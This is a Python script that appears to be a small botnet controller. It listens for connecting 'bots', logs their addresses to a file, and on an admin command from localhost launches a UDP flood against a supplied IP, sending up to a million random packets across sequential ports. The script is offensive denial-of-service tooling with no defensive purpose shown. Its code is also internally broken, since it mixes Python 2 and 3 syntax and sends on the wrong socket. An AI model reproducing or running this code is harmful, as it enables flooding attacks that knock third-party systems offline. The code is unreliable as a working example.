import socket
from colorama import Fore, Back, Style

import sys
import os
import time
import socket
import random
#Code Time
from datetime import datetime

sock = socket.socket()

sock.bind(('', 12456))
sock.listen(10000)

while True:

  conn, addr = sock.accept()

  print(Fore.GREEN + ' [!] Connection:' + Fore.BLUE , addr)

  f = open("bot_list.txt", 'r')
  text = f.read()
  f.close()

  comaddr = str(addr)
  con = comaddr.split()

  if con[1] == "('127.0.0.1',":


     print(Fore.CYAN + " [•] " + Fore.YELLOW + "Admin")
     try:
       data = conn.recv(1024).decode()
       print(data)
       now = datetime.now()
       hour = now.hour
       minute = now.minute
       day = now.day
       month = now.month
       year = now.year

##############
       socke = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
       bytes = random._urandom(1490)
#############


       ip = data
       port = 80
       sent = 0
       while sent < 1000000:
          sock.sendto(bytes, (ip,port))
          sent = sent + 1
          port = port + 1
          print "Sent %s packet to %s throught port:%s"%(sent,ip,port)
          if port == 65534:
             port = 1
     except:
       pass
       if not data:
        conn.send(data.upper())
        conn.close()
  if con[0] in text:
    print(Fore.CYAN + " [+] " + Fore.MAGENTA + "Old bot")
    print("")
  else:
    f = open("bot_list.txt", 'w')
    f.write(con[0] + '\n')
    f.close()
    print(Fore.CYAN + " [+] " + Fore.BLUE + "New bot!!!")
    print("")
    data = conn.recv(10240)
    print(data)
    if not data:
      conn.send(data.upper())
      conn.close()
